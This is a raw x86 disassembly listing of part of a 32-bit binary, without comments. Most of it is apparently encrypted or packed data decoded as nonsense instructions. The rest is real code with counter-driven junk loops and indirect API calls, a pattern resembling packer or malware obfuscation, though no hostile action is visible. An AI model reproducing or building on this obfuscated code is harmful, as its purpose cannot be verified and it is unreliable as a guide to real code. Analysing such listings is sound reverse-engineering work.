  40bbc0:	pop    eax
  40bbc1:	stos   DWORD PTR es:[edi],eax
  40bbc2:	pusha  
  40bbc3:	dec    ebp
  40bbc4:	adc    eax,0xfcb18ef6
  40bbc9:	sahf   
  40bbca:	xchg   edx,eax
  40bbcb:	jp     0x40bbc3
  40bbcd:	pop    esp
  40bbce:	mov    dl,0xc5
  40bbd0:	icebp  
  40bbd1:	addr16 xchg esp,eax
  40bbd3:	xchg   edx,eax
  40bbd4:	cwde   
  40bbd5:	mov    ebp,0x399362f5
  40bbda:	shl    DWORD PTR [ebx-0x7a],1
  40bbdd:	or     esi,DWORD PTR [ecx]
  40bbdf:	inc    edi
  40bbe0:	pop    ebx
  40bbe1:	aaa    
  40bbe2:	inc    esp
  40bbe3:	push   ss
  40bbe4:	xor    DWORD PTR [esi+0x7a],0x886f54ef
  40bbeb:	dec    edx
  40bbec:	jnp    0x40bbff
  40bbee:	mov    ah,BYTE PTR [edx+0x178594a5]
  40bbf4:	jae    0x40bc4a
  40bbf6:	mov    DWORD PTR ds:0x42c21cab,0xc9a185ca
  40bc00:	adc    BYTE PTR [ecx-0x3a],dl
  40bc03:	cdq    
  40bc04:	sti    
  40bc05:	mov    edi,0x7163b577
  40bc0a:	adc    eax,0xea271b0f
  40bc0f:	add    al,0xc1
  40bc11:	ret    
  40bc12:	or     al,0x9e
  40bc14:	nop
  40bc15:	rol    BYTE PTR [edx-0x31a500c0],0xdb
  40bc1c:	or     al,0xf6
  40bc1e:	mov    ebp,0x9231651d
  40bc23:	xchg   edx,eax
  40bc24:	inc    edx
  40bc25:	mov    edx,esp
  40bc27:	fsubr  QWORD PTR [ecx-0x60da5319]
  40bc2d:	(bad)
  40bc30:	popa   
  40bc31:	or     eax,0xdf35eb5b
  40bc36:	into   
  40bc37:	mov    bl,0x75
  40bc39:	sti    
  40bc3a:	xchg   esp,eax
  40bc3b:	fs adc eax,0xc8b7ba54
  40bc41:	xor    al,0xaf
  40bc43:	sub    BYTE PTR [ecx-0x5af3e357],0xea
  40bc4a:	stc    
  40bc4b:	jp     0x40bbff
  40bc4d:	call   0x84be:0x38400e4
  40bc54:	sub    BYTE PTR [edx+0x16],bh
  40bc57:	sar    dl,0x9f
  40bc5a:	jle    0x40bc23
  40bc5c:	cmp    BYTE PTR [edi+0xe4a0c8a],dl
  40bc62:	int    0x41
  40bc64:	sub    cl,bh
  40bc66:	out    0x6d,al
  40bc68:	pop    edi
  40bc69:	mov    edi,0x41256971
  40bc6e:	mov    DWORD PTR [edx+0x51],edi
  40bc71:	(bad)  
  40bc73:	retf   
  40bc74:	call   0x73c1:0x42c1affb
  40bc7b:	shl    ebp,cl
  40bc7d:	pop    eax
  40bc7e:	les    ebp,FWORD PTR [ecx]
  40bc80:	sahf   
  40bc81:	add    al,0xba
  40bc83:	xor    al,0x40
  40bc85:	jp     0x40bc53
  40bc87:	les    eax,FWORD PTR [ebx]
  40bc89:	sbb    BYTE PTR [ecx],cl
  40bc8b:	or     edi,DWORD PTR [esi-0x17c2a210]
  40bc91:	adc    eax,0xb8e1951b
  40bc96:	pop    ss
  40bc97:	test   DWORD PTR ds:[ebx],ebp
  40bc9a:	into   
  40bc9b:	ss in  eax,0x86
  40bc9e:	dec    edi
  40bc9f:	mov    dl,0x2
  40bca1:	aam    0x2a
  40bca3:	xor    esi,DWORD PTR [edx+ebx*8-0x22b50e53]
  40bcaa:	dec    esp
  40bcab:	fs sub eax,0xc9710db7
  40bcb1:	pop    ds
  40bcb2:	rcr    DWORD PTR [ebx+ebp*4+0xb778e80],1
  40bcb9:	push   ds
  40bcba:	leave  
  40bcbb:	(bad)  
  40bcbc:	in     al,0xeb
  40bcbe:	or     eax,0xc33528bf
  40bcc3:	cmp    BYTE PTR [ebp+0x23213530],0xe7
  40bcca:	std    
  40bccb:	adc    BYTE PTR [edx+0x2f4134e5],bh
  40bcd1:	inc    esp
  40bcd2:	repz and BYTE PTR [ecx],al
  40bcd5:	dec    esp
  40bcd6:	loopne 0x40bcf6
  40bcd8:	jne    0x40bd04
  40bcda:	mov    ah,0x52
  40bcdc:	dec    ebp
  40bcdd:	mov    eax,ds:0x78247b38
  40bce2:	or     ah,bh
  40bce4:	nop
  40bce5:	mov    ecx,0xd6302ec3
  40bcea:	lahf   
  40bceb:	fs cwde 
  40bced:	xchg   esp,eax
  40bcee:	cwde   
  40bcef:	cmp    dh,BYTE PTR [edx+0x4d]
  40bcf2:	jb     0x40bcde
  40bcf4:	dec    esp
  40bcf5:	pusha  
  40bcf6:	aad    0x5b
  40bcf8:	nop
  40bcf9:	fs call 0x2acd5092
  40bcff:	mov    ebx,0xc818a92
  40bd04:	add    ch,BYTE PTR [edi+esi*8-0x1b]
  40bd08:	mov    al,0x2f
  40bd0a:	jno    0x40bca6
  40bd0c:	dec    edx
  40bd0d:	fld    QWORD PTR [ebx+0x79]
  40bd10:	and    BYTE PTR [eax+0x3dfc5113],ch
  40bd16:	nop
  40bd17:	enter  0x4dcb,0x5a
  40bd1b:	or     BYTE PTR [esi+edi*4-0x28a302bc],dh
  40bd22:	xchg   ecx,eax
  40bd23:	out    0x99,eax
  40bd25:	or     edi,DWORD PTR [edx+0xa]
  40bd28:	outs   dx,DWORD PTR ds:[esi]
  40bd29:	iret   
  40bd2a:	hlt    
  40bd2b:	pop    edx
  40bd2c:	cmp    BYTE PTR ss:[edx+0x73],ch
  40bd30:	rcl    BYTE PTR [edx-0x72b7c9fa],0xce
  40bd37:	out    dx,eax
  40bd38:	pop    edi
  40bd39:	dec    edx
  40bd3a:	pop    ds
  40bd3b:	xchg   edi,eax
  40bd3c:	jb     0x40bd24
  40bd3e:	adc    eax,0x4634d76d
  40bd43:	mov    dh,BYTE PTR [edi]
  40bd45:	cmp    esp,DWORD PTR [ecx+0xd94570b]
  40bd4b:	outs   dx,BYTE PTR ds:[esi]
  40bd4c:	jbe    0x40bd5f
  40bd4e:	jbe    0x40bcdb
  40bd50:	or     DWORD PTR [ecx+0x31ce908],ecx
  40bd56:	add    BYTE PTR [eax],al
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	out    dx,eax
  40bd65:	sub    BYTE PTR [ebx+0x7e821c2e],dl
  40bd6b:	jle    0x40bde7
  40bd6d:	jge    0x40bded
  40bd6f:	jle    0x40bdd9
  40bd71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd72:	outs   dx,BYTE PTR ds:[esi]
  40bd73:	or     DWORD PTR [edi+ebp*1],ecx
  40bd76:	outs   dx,DWORD PTR ds:[esi]
  40bd77:	cwde   
  40bd78:	leave  
  40bd79:	cmp    BYTE PTR [eax-0x47],ch
  40bd7c:	mov    cs,WORD PTR [edx+ebx*8]
  40bd7f:	add    al,0x71
  40bd81:	push   0xffffffcb
  40bd83:	xlat   BYTE PTR ds:[ebx]
  40bd84:	cld    
  40bd85:	(bad)  
  40bd86:	cmp    ecx,DWORD PTR [ebx+0x2a]
  40bd89:	(bad)  
  40bd8a:	loopne 0x40bd11
  40bd8c:	outs   dx,BYTE PTR ds:[esi]
  40bd8d:	dec    esp
  40bd8e:	xchg   DWORD PTR [esi],edx
  40bd90:	mov    al,ds:0x76110a20
  40bd95:	mov    ecx,0xb9c155c6
  40bd9a:	dec    edx
  40bd9b:	push   es
  40bd9c:	xchg   edi,eax
  40bd9d:	xchg   ebx,eax
  40bd9e:	adc    ebx,DWORD PTR [edi+ebx*1]
  40bda1:	dec    edi
  40bda2:	sub    al,0xcc
  40bda4:	aas    
  40bda5:	into   
  40bda6:	sub    DWORD PTR [edx],ebx
  40bda8:	jb     0x40bde5
  40bdaa:	jg     0x40bd5f
  40bdac:	xor    DWORD PTR [ecx],esp
  40bdae:	inc    ecx
  40bdaf:	pushf  
  40bdb0:	loop   0x40bd66
  40bdb2:	ins    BYTE PTR es:[edi],dx
  40bdb3:	ret    0x516e
  40bdb6:	push   ss
  40bdb7:	jb     0x40bd51
  40bdb9:	push   esp
  40bdba:	(bad)  
  40bdbb:	daa    
  40bdbc:	fadd   DWORD PTR [edi+0x25]
  40bdbf:	xor    eax,0x991dfc8b
  40bdc4:	in     eax,0x45
  40bdc6:	adc    edx,ebx
  40bdc8:	mov    dl,0xdf
  40bdca:	mov    ch,0xb6
  40bdcc:	cdq    
  40bdcd:	add    al,0x21
  40bdcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdd0:	adc    eax,0x983f1bcf
  40bdd5:	mov    DWORD PTR [edi],ebx
  40bdd7:	inc    ecx
  40bdd8:	pop    esp
  40bdd9:	jnp    0x40bd7b
  40bddb:	or     DWORD PTR [ebx-0x51],esi
  40bdde:	(bad)  
  40bddf:	mov    bl,0xf4
  40bde1:	lock lods eax,DWORD PTR ds:[esi]
  40bde3:	imul   edx,DWORD PTR [edi],0x49c4d2d3
  40bde9:	das    
  40bdea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdeb:	mov    ebx,0x6f86579c
  40bdf0:	sub    dl,ch
  40bdf2:	jmp    0x40bd95
  40bdf4:	dec    esi
  40bdf5:	xchg   esi,eax
  40bdf6:	(bad)  
  40bdf7:	aaa    
  40bdf8:	mov    dh,dl
  40bdfa:	lock int3 
  40bdfc:	sub    BYTE PTR [ecx],cl
  40bdfe:	pop    ecx
  40bdff:	sub    DWORD PTR [ebx-0x1b86b80a],eax
  40be05:	daa    
  40be06:	mov    ecx,0x5862c209
  40be0b:	cdq    
  40be0c:	sub    eax,0x2791de7c
  40be11:	in     al,0x3a
  40be13:	outs   dx,DWORD PTR ds:[esi]
  40be14:	mov    esp,0x6e32fdb5
  40be19:	push   ecx
  40be1a:	pop    ecx
  40be1b:	nop
  40be1c:	aas    
  40be1d:	nop
  40be1e:	das    
  40be1f:	cmp    esp,edi
  40be21:	push   ebp
  40be22:	mov    db7,esp
  40be25:	dec    ecx
  40be26:	sub    DWORD PTR [edi+0x7b],eax
  40be29:	sub    bh,BYTE PTR [ecx+0x2a2051e]
  40be2f:	sbb    BYTE PTR [edx+0x10],dl
  40be32:	dec    esi
  40be33:	into   
  40be34:	add    al,0x22
  40be36:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40be38:	popa   
  40be39:	xchg   ecx,eax
  40be3a:	mov    ah,0xd8
  40be3c:	cs pop edx
  40be3e:	(bad)  
  40be3f:	loopne 0x40be1a
  40be41:	cmc    
  40be42:	sti    
  40be43:	leave  
  40be44:	mov    edx,0x749d71b
  40be49:	push   ebp
  40be4a:	and    ebx,edx
  40be4c:	into   
  40be4d:	jl     0x40bdf0
  40be4f:	ins    BYTE PTR es:[edi],dx
  40be50:	xchg   BYTE PTR [edx+eiz*1],ch
  40be53:	or     bl,dh
  40be55:	mov    al,ds:0x715ba400
  40be5a:	into   
  40be5b:	dec    esi
  40be5c:	adc    BYTE PTR [ecx+edi*4],al
  40be5f:	in     al,dx
  40be60:	dec    edx
  40be61:	sti    
  40be62:	ret    0xe1f3
  40be65:	jne    0x40bede
  40be67:	pusha  
  40be68:	inc    edi
  40be69:	fist   WORD PTR ds:0xdde133c9
  40be6f:	xrelease mov DWORD PTR [edx],ebx
  40be72:	aas    
  40be73:	xchg   esp,eax
  40be74:	push   esi
  40be75:	pop    esi
  40be76:	ins    DWORD PTR es:[edi],dx
  40be77:	in     eax,0x96
  40be79:	xor    BYTE PTR [ebp-0x1080e986],bh
  40be7f:	ror    DWORD PTR [edi-0x47165c4e],cl
  40be85:	jp     0x40bec3
  40be87:	push   esi
  40be88:	outs   dx,BYTE PTR ds:[esi]
  40be89:	scas   al,BYTE PTR es:[edi]
  40be8a:	ins    BYTE PTR es:[edi],dx
  40be8b:	not    DWORD PTR [esi+0x1f]
  40be8e:	jae    0x40be56
  40be90:	mov    al,ds:0x98ed84ec
  40be95:	push   edx
  40be96:	mov    ebx,0xe6a54b29
  40be9b:	mov    ds:0x327508c0,eax
  40bea0:	sbb    edx,DWORD PTR [edx]
  40bea2:	rcr    BYTE PTR [eax-0x22],1
  40bea5:	pop    edi
  40bea6:	xchg   BYTE PTR [edx-0x4],bl
  40bea9:	clc    
  40beaa:	in     eax,0xb9
  40beac:	pop    ebx
  40bead:	and    ebx,DWORD PTR [edx-0x5e]
  40beb0:	sub    eax,0x674fb005
  40beb5:	mov    ebx,0xd099ad35
  40beba:	or     BYTE PTR [ebx+0xcd3cf16],dl
  40bec0:	(bad)  
  40bec2:	xchg   esp,eax
  40bec3:	inc    ebx
  40bec4:	sbb    BYTE PTR ds:0xb7959f05,dl
  40beca:	imul   ebx,DWORD PTR ds:0x598ab3f4,0x32
  40bed1:	mov    dl,0x2e
  40bed3:	mov    esp,0x3645c0f7
  40bed8:	nop
  40bed9:	in     eax,dx
  40beda:	xchg   ah,dh
  40bedc:	jno    0x40beb3
  40bede:	aas    
  40bedf:	test   BYTE PTR [esi],ah
  40bee1:	ins    BYTE PTR es:[edi],dx
  40bee2:	xor    eax,0x7d95f4f0
  40bee7:	jl     0x40bf0c
  40bee9:	sbb    al,0x5b
  40beeb:	pop    ss
  40beec:	daa    
  40beed:	dec    esi
  40beee:	mov    ebx,edi
  40bef0:	lods   al,BYTE PTR ds:[esi]
  40bef1:	shl    BYTE PTR [esi-0x1e],cl
  40bef4:	scas   eax,DWORD PTR es:[edi]
  40bef5:	pop    edi
  40bef6:	fcompp 
  40bef8:	fistp  WORD PTR [edi+0xed42fd2]
  40befe:	or     BYTE PTR [ecx],bh
  40bf00:	js     0x40bf62
  40bf02:	popa   
  40bf03:	cwde   
  40bf04:	and    al,0xa0
  40bf06:	sub    eax,DWORD PTR [ecx+esi*1]
  40bf09:	popf   
  40bf0a:	xor    DWORD PTR ds:0xb352ba6c,ebp
  40bf10:	lock mov dh,0x2b
  40bf13:	sub    BYTE PTR [ecx+0x39ca1d7f],0x81
  40bf1a:	jl     0x40bebd
  40bf1c:	xchg   ebp,eax
  40bf1d:	fbld   TBYTE PTR [ebx]
  40bf1f:	jae    0x40befe
  40bf21:	cmp    eax,0x2fa82c3e
  40bf26:	xchg   edx,eax
  40bf27:	shr    BYTE PTR [ecx],cl
  40bf29:	jb     0x40bf89
  40bf2b:	jo     0x40bf56
  40bf2d:	out    0x78,al
  40bf2f:	sahf   
  40bf30:	and    al,0x50
  40bf32:	mov    DWORD PTR gs:[ecx+0xdaeb650],eax
  40bf39:	fcmovbe st,st(0)
  40bf3b:	dec    eax
  40bf3c:	stos   DWORD PTR es:[edi],eax
  40bf3d:	icebp  
  40bf3e:	mov    ch,0x6
  40bf40:	jmp    0x1630997b
  40bf45:	stc    
  40bf46:	pop    ds
  40bf47:	push   ecx
  40bf48:	sahf   
  40bf49:	xchg   ecx,eax
  40bf4a:	dec    esi
  40bf4b:	in     eax,0x3e
  40bf4d:	shl    esi,1
  40bf4f:	ror    DWORD PTR ds:0x6876badf,1
  40bf55:	jno    0x40bf8f
  40bf57:	fisttp WORD PTR [edx-0x1c3edaf2]
  40bf5d:	stos   BYTE PTR es:[edi],al
  40bf5e:	push   edx
  40bf5f:	ficom  WORD PTR [edx]
  40bf61:	mov    esi,0x8bc04161
  40bf66:	cld    
  40bf67:	add    DWORD PTR [ecx+0x3fa0e858],ecx
  40bf6d:	in     eax,0xe9
  40bf6f:	xchg   DWORD PTR [esp+edx*1+0x5be88fa9],esi
  40bf76:	test   eax,0xd902bf3a
  40bf7b:	lahf   
  40bf7c:	jbe    0x40bf2a
  40bf7e:	mov    dh,0xf6
  40bf80:	cmp    ch,BYTE PTR [edi-0x70]
  40bf83:	xor    eax,0xf450489d
  40bf88:	mov    esi,edx
  40bf8a:	jmp    0x524d:0xf1cbfa0f
  40bf91:	or     bl,bl
  40bf93:	mov    dl,BYTE PTR [edi+0x2e]
  40bf96:	sub    al,0xde
  40bf98:	(bad)  
  40bf9a:	push   esi
  40bf9b:	std    
  40bf9c:	es out dx,al
  40bf9e:	fcmovne st,st(5)
  40bfa0:	sbb    DWORD PTR [eax],edx
  40bfa2:	and    al,0xd8
  40bfa4:	adc    eax,0x8a17a2a3
  40bfa9:	loop   0x40bf61
  40bfab:	sub    edi,DWORD PTR [edi+0x5a]
  40bfae:	pop    ds
  40bfaf:	mov    WORD PTR [esi],es
  40bfb1:	aaa    
  40bfb2:	sbb    ch,BYTE PTR [ebx-0x30007a65]
  40bfb8:	dec    ecx
  40bfb9:	ret    0x8206
  40bfbc:	pop    edi
  40bfbd:	jne    0x40bf8d
  40bfbf:	push   ecx
  40bfc0:	popa   
  40bfc1:	stc    
  40bfc2:	mov    bh,0x26
  40bfc4:	dec    edi
  40bfc5:	cli    
  40bfc6:	adc    eax,0xd074c228
  40bfcb:	adc    eax,0x8209ab60
  40bfd0:	mov    ebp,0x7231fd46
  40bfd5:	inc    edi
  40bfd6:	ror    ch,1
  40bfd8:	retf   0x5ae4
  40bfdb:	in     al,dx
  40bfdc:	fsub   DWORD PTR [edx+0x554383a2]
  40bfe2:	dec    ebp
  40bfe3:	sbb    eax,0x92843c1c
  40bfe8:	xchg   edx,eax
  40bfe9:	sbb    DWORD PTR [esi],esi
  40bfeb:	jp     0x40bfb3
  40bfed:	xor    al,0x90
  40bfef:	pop    edx
  40bff0:	cmp    eax,0x5c518d1f
  40bff5:	in     eax,0x9a
  40bff7:	push   esi
  40bff8:	aaa    
  40bff9:	adc    eax,0x8aed07d0
  40bffe:	adc    DWORD PTR ds:0x66140f4b,ebx
  40c004:	sbb    DWORD PTR [ecx],esi
  40c006:	push   es
  40c007:	push   ebx
  40c008:	hlt    
  40c009:	sbb    dh,BYTE PTR [eax-0x274c7252]
  40c00f:	xchg   esi,eax
  40c010:	retf   0x1577
  40c013:	add    eax,0x4bcf1726
  40c018:	sbb    edi,DWORD PTR [edi+0x71ff8694]
  40c01e:	mov    ebx,0x3bc8a8e8
  40c023:	push   edi
  40c024:	cdq    
  40c025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c026:	nop
  40c027:	popa   
  40c028:	les    edi,FWORD PTR [ebp-0x1e]
  40c02b:	mov    ebx,0x54bd21c1
  40c030:	lds    cx,DWORD PTR ds:0xc9f12bc8
  40c037:	ror    ecx,cl
  40c039:	jmp    0xe9de:0x4665c22
  40c040:	addr16 push edi
  40c042:	adc    cl,BYTE PTR [ecx]
  40c044:	jmp    0x5ac90e9f
  40c049:	jp     0x40c060
  40c04b:	xor    eax,0x4860b250
  40c050:	pop    eax
  40c051:	ins    BYTE PTR es:[edi],dx
  40c052:	cmc    
  40c053:	pop    eax
  40c054:	icebp  
  40c055:	enter  0xef2c,0xdc
  40c059:	out    0x8a,eax
  40c05b:	cmp    DWORD PTR [ebx],0x2f
  40c05e:	sub    cl,BYTE PTR [edx+ebp*1]
  40c061:	xchg   edx,eax
  40c062:	stos   BYTE PTR es:[edi],al
  40c063:	or     ecx,DWORD PTR [esp+ebp*2+0x1f7f63a7]
  40c06a:	ss mov ah,0x39
  40c06d:	adc    DWORD PTR [esi-0x6f8267b2],ebx
  40c073:	in     al,dx
  40c074:	mov    eax,DWORD PTR [ebp+0xc]
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433617,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433627
  40c0b4:	and    DWORD PTR ds:0x433683,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4336b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4336b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4336b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4336b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4336b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4336e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4336e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4336e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4336e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4336e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4336e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4336e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4336e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433683,0x1d
  40c169:	cmp    DWORD PTR ds:0x433683,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433683,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433780
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433683,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433683
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433683,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433683
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433683,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4336ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4336b7
  40c1dd:	xor    DWORD PTR ds:0x433613,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43361b,0x43367b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43362b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4336a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4336a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4336a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4336a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4336a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4336eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4336eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4336eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4336eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4336eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4336eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4336eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4336eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433633,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433633
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433633,esi
  40c2c4:	cmp    DWORD PTR ds:0x433633,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433633,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4336f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4336eb
  40c301:	adc    DWORD PTR ds:0x4336fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43364b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433687
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4336e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43362f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4336a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433633,0x433667
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4336ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4336ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4336ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4336ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4336ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4336ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4336ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4336ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43366b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4336ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4336ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43372b,0x43373b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4336af,0x4336bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4336c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433637,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43362b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43362f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433623,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4336e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4336f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4336a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4336eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4336eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4336eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4336eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4336eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4336eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4336eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4336eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
